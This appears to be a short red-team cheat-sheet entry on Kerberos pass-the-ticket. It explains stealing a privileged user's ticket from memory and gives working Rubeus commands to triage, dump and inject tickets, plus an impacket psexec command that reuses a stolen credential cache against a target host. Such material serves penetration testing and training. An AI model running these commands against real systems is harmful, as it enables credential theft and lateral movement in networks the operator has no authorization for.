**Remember the Kerberos "wristband" ticket?** If you land on a machine where a privileged user left a ticket sitting in memory, you can steal it and reuse it to access whatever they could — no password needed. `triage`/`dump` grab the tickets; `ptt` ("pass the ticket") injects one into your session so you effectively become that user.

```
# Windows (Rubeus):
.\Rubeus.exe triage
.\Rubeus.exe dump /luid:<LUID> /service:krbtgt /nowrap
.\Rubeus.exe ptt /ticket:<BASE64_TICKET>
dir \\<TARGET_FQDN>\C$

# Linux:
export KRB5CCNAME=/tmp/ticket.ccache
psexec.py -k -no-pass corp.local/administrator@<TARGET_FQDN>
```